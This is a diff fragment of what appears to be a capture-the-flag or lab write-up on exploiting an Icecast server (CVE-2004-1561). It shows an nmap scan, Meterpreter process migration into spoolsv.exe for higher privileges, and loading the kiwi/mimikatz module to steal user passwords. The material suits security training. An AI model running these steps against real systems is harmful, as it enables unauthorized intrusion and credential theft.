@@ -3,7 +3,7 @@
 ```
 nmap -sV <machine ip>
 ```
-![img of port scan](port_scan.png)
+![img of port scan](port_scan.png) <br>
 we search for vulnerablilites on CVE for the icecast service on port 8000<br>
 found vulnerability execute code overflow CVE-2004-1561 <br>
 ## 2. Exploiting
@@ -39,6 +39,7 @@ ps
 migrate -N spoolsv.exe
 ```
 this migrates our process to a process which has more privileges. <br>
+## 4. Stealing data
 now we load the mimikatz or kiwi module to steal the passwords of the users
 ```
 load kiwi
